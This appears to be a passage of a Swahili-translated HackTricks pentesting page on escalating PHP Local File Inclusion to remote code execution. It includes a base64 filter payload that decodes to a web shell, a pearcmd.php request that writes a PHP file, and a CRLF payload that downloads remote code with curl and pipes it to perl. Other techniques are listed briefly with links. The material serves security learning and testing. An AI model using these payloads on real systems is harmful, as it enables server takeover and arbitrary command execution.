Kama ilivyoonyeshwa katika [this](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64) article, PHP base64 filter inapuuzia vitu visivyo base64. Unaweza kutumia hilo kuepuka ukaguzi wa file extension: ikiwa utatoa base64 inayomalizika na ".php", itapuuzia tu "." na kuongeza "php" kwenye base64. Hapa kuna mfano wa payload:
```url
http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
### Kupitia php filters (hakuna faili inahitajika)

Hii [**writeup**](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d) inaelezea kwamba unaweza kutumia **php filters** kuunda maudhui yoyote kama matokeo. Hii kwa msingi inamaanisha kwamba unaweza **kuunda arbitrary php code** kwa ajili ya include **bila kuhitaji kuiandika** kwenye faili.


{{#ref}}
lfi2rce-via-php-filters.md
{{#endref}}

### Kupitia segmentation fault

**Pakia** faili itakayohifadhiwa kama **kwa muda** kwenye `/tmp`, kisha katika **maombi yale yale,** chochea **segmentation fault**, na kisha faili **ya muda haitafutwa** na unaweza kuitafuta.


{{#ref}}
lfi2rce-via-segmentation-fault.md
{{#endref}}

### Kupitia uhifadhi wa faili za muda wa Nginx

Iwapo umepata **Local File Inclusion** na **Nginx** inaendesha mbele ya PHP, unaweza kupata RCE kwa kutumia mbinu ifuatayo:


{{#ref}}
lfi2rce-via-nginx-temp-files.md
{{#endref}}

### Kupitia PHP_SESSION_UPLOAD_PROGRESS

Iwapo umepata **Local File Inclusion** hata kama **huna session** na `session.auto_start` imewekwa `Off`. Ukiweka **`PHP_SESSION_UPLOAD_PROGRESS`** katika data ya **multipart POST**, PHP itaamsha session kwako. Unaweza kudanganya hili kupata RCE:


{{#ref}}
via-php_session_upload_progress.md
{{#endref}}

### Kupitia upakiaji wa faili za muda kwenye Windows

Kama umepata **Local File Inclusion** na server inaendesha kwenye **Windows**, unaweza kupata RCE:


{{#ref}}
lfi2rce-via-temp-file-uploads.md
{{#endref}}

### Kupitia `pearcmd.php` + URL args

Kama [**ilivyoelezwa katika chapisho hili**](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp), script `/usr/local/lib/phppearcmd.php` ipo kwa chaguo-msingi katika php docker images. Aidha, inawezekana kupitisha argumento kwa script kupitia URL kwa sababu inaonyesha kwamba ikiwa param ya URL haina `=`, inapaswa kutumika kama argumento. Tazama pia [watchTowr’s write-up](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/) na [Orange Tsai’s “Confusion Attacks”](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/).

Ombi lifuatalo litaumba faili katika `/tmp/hello.php` yenye maudhui `<?=phpinfo()?>`:
```bash
GET /index.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/hello.php HTTP/1.1
```
Ifuatayo inatumia CRLF vuln kupata RCE (kutoka [**here**](https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1)):
```
http://server/cgi-bin/redir.cgi?r=http:// %0d%0a
Location:/ooo? %2b run-tests %2b -ui %2b $(curl${IFS}orange.tw/x|perl) %2b alltests.php %0d%0a
Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/usr/local/lib/php/pearcmd.php %0d%0a
%0d%0a
```
### Kupitia phpinfo() (file_uploads = on)

Ikiwa umepata **Local File Inclusion** na faili inayoonyesha **phpinfo()** na file_uploads = on unaweza kupata RCE:


{{#ref}}
lfi2rce-via-phpinfo.md
{{#endref}}

### Kupitia compress.zlib + `PHP_STREAM_PREFER_STUDIO` + Path Disclosure

Ikiwa umepata **Local File Inclusion** na unaweza **exfiltrate** njia ya faili ya temp LAKINI **server** inakagua ikiwa **file to be included has PHP marks**, unaweza kujaribu **bypass that check** kwa kutumia hii **Race Condition**:


{{#ref}}
lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md
{{#endref}}

### Kupitia eternal waiting + bruteforce

Ikiwa unaweza kutumia LFI ili **upload temporary files** na kumfanya **server** **hang** utekelezaji wa PHP, unaweza kisha **brute force** majina ya faili kwa muda wa saa ili kupata faili ya muda:


{{#ref}}
lfi2rce-via-eternal-waiting.md
{{#endref}}

### Kusababisha Fatal Error

Ikiwa ujumuisha yoyote ya faili `/usr/bin/phar`, `/usr/bin/phar7`, `/usr/bin/phar.phar7`, `/usr/bin/phar.phar`. (Unahitaji kujumuisha ile ile mara 2 ili kusababisha error hiyo).

**Sijui jinsi hii ni muhimu lakini huenda iwe hivyo.**\
_Hata ikiwa unasababisha PHP Fatal Error, PHP temporary files uploaded zinafutwa._

<figure><img src="../../images/image (1031).png" alt=""><figcaption></figcaption></figure>


## Marejeo

- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)
- [PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)
- [Horizon3.ai – From Support Ticket to Zero Day (FreeFlow Core path traversal → arbitrary write → webshell)](https://horizon3.ai/attack-research/attack-blogs/from-support-ticket-to-zero-day/)
- [Xerox Security Bulletin 025-013 – FreeFlow Core 8.0.5](https://securitydocs.business.xerox.com/wp-content/uploads/2025/08/Xerox-Security-Bulletin-025-013-for-Freeflow-Core-8.0.5.pdf)
- [watchTowr – We need to talk about PHP (pearcmd.php gadget)](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/)
- [Orange Tsai – Confusion Attacks on Apache](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/)
- [VTENEXT 25.02 – a three-way path to RCE](https://blog.sicuranext.com/vtenext-25-02-a-three-way-path-to-rce/)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)

{{#file}}
EN-Local-File-Inclusion-1.pdf
{{#endfile}}

{{#include ../../banners/hacktricks-training.md}}
